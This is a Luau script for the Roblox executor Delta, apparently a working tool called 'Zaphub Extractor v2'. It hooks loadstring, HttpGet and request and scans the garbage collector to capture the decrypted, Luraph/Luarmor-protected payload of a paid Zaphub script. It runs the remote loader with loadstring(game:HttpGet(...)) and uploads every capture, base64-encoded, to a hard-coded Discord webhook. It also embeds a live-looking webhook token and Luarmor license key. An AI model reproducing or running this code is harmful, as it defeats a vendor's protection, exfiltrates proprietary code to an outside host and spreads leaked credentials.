--!strict
--[[
    Zaphub Extractor v2 - Captura o payload final (Luraph/Luarmor) no Delta
    Plataforma: Delta (hookfunction + hookmetamethod + getgc)

    POR QUE O v1 FALHOU:
      Reatribuir _G.loadstring nao intercepta nada: o Luarmor captura a closure
      ORIGINAL de loadstring/load como upvalue (ou usa API interna) e ignora a
      global. Prova: nem o loader Luarmor (1420 bytes) foi pego no v1.

    SOLUCAO v2 - 3 FRENTES DE CAPTURA:
      [1] hookfunction: patcheia a closure REAL de loadstring/load (in-place).
          Mesmo que o ofuscador tenha a referencia original capturada, a chamada
          passa pelo nosso hook (e captura o bytecode Luraph final).
      [2] hookmetamethod __namecall + request: captura TODOS os HttpGet/request
          (URLs + respostas). Isso pega o init do CDN (v4_init_marbeg.lua) que
          contem o runtime criptografado - decripto offline com a script_key.
      [3] getgc() scan pos-carga: varre o heap em busca de closures grandes
          (Luraph) e salva o bytecode via dumpstring.

    SEGURANCA ANTI-TRAVA (padrao da casa):
      - I/O de rede so em task.spawn dedicada
      - Salva local PRIMEIRO (writefile) - envio falhou, arquivo fica
      - Hooks retornam o resultado original SEM bloquear o thread do jogo
]]

--//==============================[ CONFIG ]==============================//--
local WEBHOOK_URL = "https://discord.com/api/webhooks/1398723880369131631/7knZsAymoHblk9BcsXYuI7XT2-8PNHkZJfFbtyLHssHqjW_pXeBQVznZ0lDHz7G9ObRI"
local WEBHOOK_NAME = "Zaphub Extractor"
local SAVE_DIR = "ZaphubExtract"

-- Chave Luarmor (global direta + _G - padrao oficial do loader)
script_key = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"
_G.script_key = script_key

-- Comando oficial exato do Zaphub
local ZAPHUB_SNIPPET = "script_key=%q; loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()"
local ZAPHUB_KEY = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"

-- tamanho minimo para considerar "payload real"
local MIN_CAPTURE = 500
-- limite de chunks de loadstring
local MAX_CAPTURES = 25
-- limite de respostas HTTP salvas
local MAX_HTTP = 15
-- limite de closures do getgc
local MAX_GC = 10
-- tempo de monitoramento (segundos)
local MONITOR_TIME = 90

--//==============================[ API COMPAT ]==============================//--
local getExecutorName = (function()
    local fn = identifyexecutor or identify_executor
    if fn then
        local ok, name = pcall(fn)
        if ok and type(name) == "string" then return name end
    end
    return "unknown"
end)()

local hf = hookfunction
local cf = clonefunction
local hmm = hookmetamethod
local gnmc = getnamecallmethod
local gcFn = getgc
local dumpFn = dumpstring or decompile

local copy = (function()
    if setclipboard then return setclipboard end
    if toclipboard then return toclipboard end
    if set_clipboard then return set_clipboard end
    return function() end
end)()

local reqFn = (function()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    return nil
end)()

local writefileFn = writefile
local makefolderFn = makefolder or function() end
local isfileFn = isfile or function() return false end
local readfileFn = readfile

local function logMsg(msg)
    pcall(print, "[ZaphubExtract] " .. tostring(msg))
end

--//==============================[ BASE64 ]==============================//--
local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64encode(data)
    local b = 1
    local out = {}
    local len = #data
    for i = 1, len, 3 do
        local c1 = string.byte(data, i)
        local c2 = i + 1 <= len and string.byte(data, i + 1) or 0
        local c3 = i + 2 <= len and string.byte(data, i + 2) or 0
        local n = c1 * 65536 + c2 * 256 + c3
        local pad = i + 2 > len and 1 or (i + 1 > len and 2 or 0)
        out[b] = b64chars:sub(math.floor(n / 262144) % 64 + 1, math.floor(n / 262144) % 64 + 1)
        out[b + 1] = b64chars:sub(math.floor(n / 4096) % 64 + 1, math.floor(n / 4096) % 64 + 1)
        out[b + 2] = b64chars:sub(math.floor(n / 64) % 64 + 1, math.floor(n / 64) % 64 + 1)
        out[b + 3] = b64chars:sub(n % 64 + 1, n % 64 + 1)
        if pad == 1 then out[b + 3] = "=" end
        if pad == 2 then out[b + 2] = "="; out[b + 3] = "=" end
        b = b + 4
    end
    return table.concat(out)
end

--//==============================[ WEBHOOK ]==============================//--
local function jsonString(s)
    s = tostring(s)
    s = s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
    s = s:gsub("[%z\1-\31]", function(c) return string.format("\\u%04x", c:byte()) end)
    return "\"" .. s .. "\""
end

local function sendSimple(content, username)
    if not reqFn then return -1 end
    local body = '{"content":' .. jsonString(content) .. ',"username":' .. jsonString(username or WEBHOOK_NAME) .. '}'
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

local function sendFileMulti(msg, files)
    if not reqFn then return -1 end
    local boundary = "----ZaphubX" .. tostring(os.clock()):gsub("%.", "") .. "7xK"
    local body = ""
    if msg and #tostring(msg) > 0 then
        body = body .. "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. tostring(msg) .. "\r\n"
    end
    for i = 1, #files do
        body = body .. "--" .. boundary
            .. "\r\nContent-Disposition: form-data; name=\"file" .. tostring(i) .. "\"; filename=\"" .. tostring(files[i].name) .. "\""
            .. "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
            .. tostring(files[i].content)
            .. "\r\n"
    end
    body = body .. "--" .. boundary .. "--\r\n"
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

--//==============================[ ESTADO DA CAPTURA ]==============================//--
local captured = 0
local captures = {}
local httpCaptured = 0
local gcCaptured = 0
local manifest = {}

local function logManifest(line)
    table.insert(manifest, tostring(line))
end

-- Salva local (PRIMEIRO - garantia)
local function saveLocal(fname, content)
    if not writefileFn then return false end
    return pcall(function()
        pcall(makefolderFn, SAVE_DIR)
        writefileFn(SAVE_DIR .. "/" .. fname, content)
    end)
end

-- Envia captura de forma ASSINCRONA
local function sendCaptureAsync(tag, title, chunk, fname)
    task.spawn(function()
        task.wait(0.1)
        local b64 = b64encode(chunk)
        local msg = "**Zaphub Extractor - " .. title .. "**\n"
            .. "Tamanho: " .. tostring(#chunk) .. " bytes | Base64: " .. tostring(#b64) .. " chars\n"
            .. "Executor: " .. getExecutorName
        local ok = false
        if #b64 < 6000000 then
            local c = sendFileMulti(msg, { { name = fname, content = b64 } })
            ok = c >= 200 and c < 300
        end
        if not ok then
            sendSimple("**Zaphub Extractor** - falha ao enviar " .. tag
                .. " (b64 " .. tostring(#b64) .. " chars). Salvo local.", WEBHOOK_NAME .. " [AVISO]")
        end
    end)
end

--//==============================[ HOOK [1]: LOADSTRING/LOAD via hookfunction ]==============================//--
local hooked = false
local hookMethod = "nenhum"

-- Hooka UMA closure patcheando a closure real (pega referencia capturada).
-- Se clonefunction/hookfunction nao existir, cai na reatribuicao de global.
local function installLoadstringHook()
    local ls = _G.loadstring
    local ld = _G.load

    local function makeCb(original)
        return function(s, chunkname)
            local f, err = original(s, chunkname)
            if f and type(s) == "string" and #s >= MIN_CAPTURE and captured < MAX_CAPTURES then
                captured = captured + 1
                local idx = captured
                captures[idx] = s
                logMsg("CAPTURADO chunk #" .. tostring(idx) .. " (" .. tostring(#s) .. " bytes)")
                logManifest("loadstring chunk #" .. tostring(idx) .. " | " .. tostring(#s) .. " bytes")
                pcall(saveLocal, "bytecode_" .. tostring(idx) .. ".bin", s)
                pcall(saveLocal, "bytecode_" .. tostring(idx) .. ".b64.txt", b64encode(s))
                sendCaptureAsync("chunk", "BYTECODE " .. tostring(idx), s, "bytecode_" .. tostring(idx) .. ".b64.txt")
            end
            return f, err
        end
    end

    local okPatch = false

    -- caminho A: hookfunction na closure real
    if type(hf) == "function" and type(ls) == "function" then
        local okCl, origLs = pcall(function() return cf and cf(ls) or nil end)
        local originalLs = (type(okCl) == "boolean" and okCl and type(origLs) == "function") and origLs or nil
        local okH = pcall(hf, ls, makeCb(originalLs))
        if okH then
            okPatch = true
            hookMethod = "hookfunction"
        end
    end
    if not okPatch and type(hf) == "function" and type(ld) == "function" then
        local okCl, origLd = pcall(function() return cf and cf(ld) or nil end)
        local originalLd = (type(okCl) == "boolean" and okCl and type(origLd) == "function") and origLd or nil
        local okH = pcall(hf, ld, makeCb(originalLd))
        if okH then
            okPatch = true
            hookMethod = "hookfunction"
        end
    end

    -- caminho B: fallback reatribuicao de global (se hookfunction falhou)
    if not okPatch then
        local oldGlobal = _G.loadstring or _G.load
        if oldGlobal then
            local hookFn = function(s, chunkname)
                local f, err = oldGlobal(s, chunkname)
                if f and type(s) == "string" and #s >= MIN_CAPTURE and captured < MAX_CAPTURES then
                    captured = captured + 1
                    local idx = captured
                    captures[idx] = s
                    logMsg("CAPTURADO chunk #" .. tostring(idx) .. " (" .. tostring(#s) .. " bytes) [fallback global]")
                    logManifest("loadstring chunk #" .. tostring(idx) .. " (fallback global) | " .. tostring(#s) .. " bytes")
                    pcall(saveLocal, "bytecode_" .. tostring(idx) .. ".bin", s)
                    pcall(saveLocal, "bytecode_" .. tostring(idx) .. ".b64.txt", b64encode(s))
                    sendCaptureAsync("chunk", "BYTECODE " .. tostring(idx), s, "bytecode_" .. tostring(idx) .. ".b64.txt")
                end
                return f, err
            end
            local okA = pcall(function() _G.loadstring = hookFn end)
            local okB = pcall(function() _G.load = hookFn end)
            if okA or okB then
                okPatch = true
                hookMethod = "global-reassign"
            end
        end
    end

    hooked = okPatch
    logMsg("Hook loadstring: " .. hookMethod .. (okPatch and " OK" or " FALHOU"))
    return okPatch
end

--//==============================[ HOOK [2]: HTTP (__namecall + request) ]==============================//--
local httpHookOk = false
local requestHookOk = false

local function captureHttpResponse(url, body)
    if type(body) ~= "string" or #body < MIN_CAPTURE then return end
    if httpCaptured >= MAX_HTTP then return end
    -- filtra URLs relevantes (Luarmor/CDN/Zaphub)
    local low = string.lower(tostring(url))
    if not (low:find("luarmor") or low:find("cdn") or low:find("zaphub") or low:find("_ca920af6193")) then return end
    httpCaptured = httpCaptured + 1
    local idx = httpCaptured
    logMsg("HTTP CAPTURADO #" .. tostring(idx) .. ": " .. tostring(url) .. " (" .. tostring(#body) .. " bytes)")
    logManifest("http #" .. tostring(idx) .. " | " .. tostring(url) .. " | " .. tostring(#body) .. " bytes")
    pcall(saveLocal, "http_" .. tostring(idx) .. "_url.txt", tostring(url))
    pcall(saveLocal, "http_" .. tostring(idx) .. ".lua", body)
    -- envia o runtime (texto Lua) como anexo
    sendCaptureAsync("http", "RUNTIME HTTP " .. tostring(idx), body, "http_" .. tostring(idx) .. ".lua.b64.txt")
end

local function installHttpGetHook()
    -- caminho A: hookmetamethod __namecall
    if type(hmm) == "function" and type(gnmc) == "function" then
        local okOld, old = pcall(hmm, game, "__namecall")
        if okOld and type(old) == "function" then
            local okH = pcall(hmm, game, "__namecall", function(self, ...)
                local method = gnmc()
                if method == "HttpGet" or method == "HttpGetAsync" then
                    local url = select(1, ...)
                    local packed = { ... }
                    local okGet, body = pcall(function()
                        return old(self, table.unpack(packed))
                    end)
                    if okGet then
                        if type(body) == "string" then
                            captureHttpResponse(url, body)
                        end
                        return body
                    end
                    error(tostring(body), 0)
                end
                return old(self, ...)
            end)
            if okH then
                httpHookOk = true
                logMsg("Hook HTTP: hookmetamethod __namecall OK")
                return true
            end
        end
    end
    -- caminho B: hookfunction em game.HttpGet
    if type(hf) == "function" then
        local okH = pcall(hf, game.HttpGet, function(self, ...)
            local packed = { ... }
            local okGet, body = pcall(function()
                return game.HttpGet(self, table.unpack(packed))
            end)
            if okGet then
                if type(body) == "string" then
                    captureHttpResponse(tostring(packed[1]), body)
                end
                return body
            end
            error(tostring(body), 0)
        end)
        if okH then
            httpHookOk = true
            logMsg("Hook HTTP: hookfunction game.HttpGet OK")
            return true
        end
    end
    logMsg("Hook HTTP: FALHOU")
    return false
end

local function installRequestHook()
    if type(hf) ~= "function" then return false end
    local targets = {}
    if type(reqFn) == "function" then
        targets[#targets + 1] = reqFn
    end
    if syn and type(syn.request) == "function" then
        targets[#targets + 1] = syn.request
    end
    if http and type(http.request) == "function" then
        targets[#targets + 1] = http.request
    end
    local done = false
    for i = 1, #targets do
        local okCl, orig = pcall(function() return cf and cf(targets[i]) or nil end)
        local original = (type(okCl) == "boolean" and okCl and type(orig) == "function") and orig or nil
        local okH = pcall(hf, targets[i], function(options)
            local res = original and original(options) or targets[i](options)
            if type(res) == "table" and type(res.Body) == "string" and type(options) == "table" and type(options.Url) == "string" then
                captureHttpResponse(options.Url, res.Body)
            end
            return res
        end)
        if okH then done = true end
    end
    if done then
        requestHookOk = true
        logMsg("Hook HTTP: request OK")
    else
        logMsg("Hook HTTP: request FALHOU")
    end
    return done
end

--//==============================[ HOOK [3]: getgc scan ]==============================//--
local function scanGCForLuraph()
    if type(gcFn) ~= "function" then
        logMsg("getgc indisponivel")
        return 0
    end
    local found = 0
    local seen = {}
    local okG, g = pcall(gcFn)
    if not okG or type(g) ~= "table" then return 0 end
    for _, v in ipairs(g) do
        if found >= MAX_GC then break end
        if type(v) == "function" and type(dumpFn) == "function" then
            -- pre-filtro: funcao de script (nao nativa)
            local okI, info = pcall(debug.getinfo, v, "S")
            if not okI or type(info) ~= "table" then continue end
            local src = tostring(info.source or "")
            if src:sub(1, 1) == "[" and src:sub(1, 2) == "[C" then
                continue -- closure nativa
            end
            local okD, dump = pcall(dumpFn, v)
            if okD and type(dump) == "string" and #dump >= 2000 then
                local key = dump:sub(1, 64)
                if not seen[key] then
                    seen[key] = true
                    gcCaptured = gcCaptured + 1
                    local idx = gcCaptured
                    logMsg("GC CLOSURE #" .. tostring(idx) .. " dump " .. tostring(#dump) .. " bytes (src=" .. src .. ")")
                    logManifest("gc closure #" .. tostring(idx) .. " | " .. tostring(#dump) .. " bytes | src=" .. src)
                    pcall(saveLocal, "gc_" .. tostring(idx) .. ".bin", dump)
                    pcall(saveLocal, "gc_" .. tostring(idx) .. ".b64.txt", b64encode(dump))
                    sendCaptureAsync("gc", "GC CLOSURE " .. tostring(idx), dump, "gc_" .. tostring(idx) .. ".b64.txt")
                    found = found + 1
                end
            end
        end
    end
    logMsg("Scan getgc: " .. tostring(found) .. " closure(s) Luraph")
    return found
end

--//==============================[ EXECUCAO DO LOADER OFICIAL ]==============================//--
local function runOfficialLoader()
    local snippet = string.format(ZAPHUB_SNIPPET, ZAPHUB_KEY)
    logMsg("Executando snippet oficial: " .. snippet)
    local okRun, errRun = pcall(function()
        local f = loadstring(snippet)
        if f then f() end
    end)
    if not okRun then
        logMsg("Erro ao executar snippet: " .. tostring(errRun))
        return false, tostring(errRun)
    end
    return true, nil
end

--//==============================[ UI MINIMALISTA ]==============================//--
local Players = game:GetService("Players")
local function makeUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ZaphubExtractor"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.AnchorPoint = Vector2.new(0.5, 0.5)
    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
    bg.Size = UDim2.new(0, 380, 0, 210)
    bg.BackgroundColor3 = Color3.fromRGB(15, 17, 25)
    bg.BackgroundTransparency = 0.05
    bg.BorderSizePixel = 0
    bg.Parent = gui
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = bg
    end)

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Size = UDim2.new(1, 0, 0, 34)
    title.Font = Enum.Font.GothamBold
    title.Text = "ZAPHUB EXTRACTOR v2"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Parent = bg

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Position = UDim2.new(0, 12, 0, 50)
    status.Size = UDim2.new(1, -24, 0, 110)
    status.Font = Enum.Font.Gotham
    status.Text = "Instalando hooks..."
    status.TextColor3 = Color3.fromRGB(255, 200, 80)
    status.TextSize = 13
    status.TextWrapped = true
    status.Parent = bg

    return {
        gui = gui,
        setStatus = function(text, color)
            status.Text = text
            if color then status.TextColor3 = color end
        end,
    }
end

local ui = (function()
    local ok, u = pcall(makeUI)
    if ok and u then return u end
    return { gui = nil, setStatus = function(text) logMsg("[status] " .. tostring(text)) end }
end)()

--//==============================[ MAIN ]==============================//--
local function mainFlow()
    ui.setStatus("Instalando hooks (3 frentes)...", Color3.fromRGB(255, 200, 80))

    local okHookLs = installLoadstringHook()
    local okHookHttp = installHttpGetHook()
    local okHookReq = installRequestHook()

    ui.setStatus("Hooks: loadstring [" .. tostring(okHookLs and "OK" or "FAIL") .. "]\n"
        .. "HTTP [" .. tostring(okHookHttp and "OK" or "FAIL") .. "] request [" .. tostring(okHookReq and "OK" or "FAIL") .. "]",
        Color3.fromRGB(255, 200, 80))

    -- ping de teste
    if reqFn then
        task.spawn(function()
            task.wait(0.2)
            local code = sendSimple(
                "**Zaphub Extractor v2 - TESTE**\nExecutor: " .. getExecutorName
                    .. "\nHook loadstring: " .. tostring(hookMethod)
                    .. "\nHook HTTP: " .. tostring(okHookHttp)
                    .. "\nHook request: " .. tostring(okHookReq),
                WEBHOOK_NAME .. " [TESTE]"
            )
            logMsg("Ping: codigo " .. tostring(code))
        end)
    end

    ui.setStatus("Executando loader oficial...", Color3.fromRGB(255, 200, 80))
    local ok, err = runOfficialLoader()
    if not ok then
        ui.setStatus("Falha ao executar loader:\n" .. tostring(err), Color3.fromRGB(255, 80, 80))
        return
    end

    -- monitora por MONITOR_TIME segundos
    local waited = 0
    while waited < MONITOR_TIME do
        task.wait(1)
        waited = waited + 1
        if waited % 10 == 0 then
            ui.setStatus("Aguardando captura... " .. tostring(waited) .. "s\n"
                .. "chunks: " .. tostring(captured) .. " | http: " .. tostring(httpCaptured) .. " | gc: " .. tostring(gcCaptured),
                Color3.fromRGB(255, 200, 80))
        end
        if captured >= MAX_CAPTURES and httpCaptured >= MAX_HTTP then break end
    end

    -- scan final no heap
    ui.setStatus("Scan final no heap (getgc)...", Color3.fromRGB(255, 200, 80))
    local gcFound = scanGCForLuraph()

    -- escreve manifest
    pcall(saveLocal, "manifest.txt", table.concat(manifest, "\n"))

    ui.setStatus("RESULTADO: chunks " .. tostring(captured) .. " | http " .. tostring(httpCaptured)
        .. " | gc " .. tostring(gcFound) .. "\nSalvos em: " .. SAVE_DIR .. "/",
        Color3.fromRGB(80, 230, 120))

    sendSimple("**Zaphub Extractor v2 - RESUMO**\n"
        .. "Executor: " .. getExecutorName
        .. "\nHook loadstring: " .. tostring(hookMethod)
        .. "\nChunks loadstring: " .. tostring(captured)
        .. "\nHTTP (luarmor/cdn): " .. tostring(httpCaptured)
        .. "\nGC closures: " .. tostring(gcFound),
        WEBHOOK_NAME .. " [RESUMO]")
end

task.spawn(function()
    xpcall(mainFlow, function(err)
        local ok, trace = pcall(debug.traceback, tostring(err), 2)
        pcall(logMsg, "ERRO RAIZ: " .. tostring(err) .. "\n" .. tostring(ok and trace or ""))
        ui.setStatus("ERRO: " .. tostring(err), Color3.fromRGB(255, 80, 80))
        if reqFn then
            task.spawn(function()
                sendSimple("**Zaphub Extractor v2 - ERRO**\n```\n" .. tostring(err) .. "\n```", WEBHOOK_NAME .. " [ERRO]")
            end)
        end
        return nil
    end)
end)
